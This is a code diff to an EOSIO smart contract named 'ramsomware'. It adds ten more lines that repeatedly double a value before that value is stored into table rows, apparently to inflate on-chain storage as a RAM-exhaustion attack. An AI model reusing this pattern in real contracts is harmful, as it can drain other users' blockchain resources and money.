@@ -75,6 +75,16 @@ class [[eosio::contract]] ramsomware: public contract{
                 A = A+ A;
                 A = A+ A;
                 A = A+ A;
+                A = A+ A;
+                A = A+ A;
+                A = A+ A;
+                A = A+ A;
+                A = A+ A;
+                A = A+ A;
+                A = A+ A;
+                A = A+ A;
+                A = A+ A;
+                A = A+ A;
                 row.s0 = A;
                 row.s1 = A;
                 row.s2 = A;
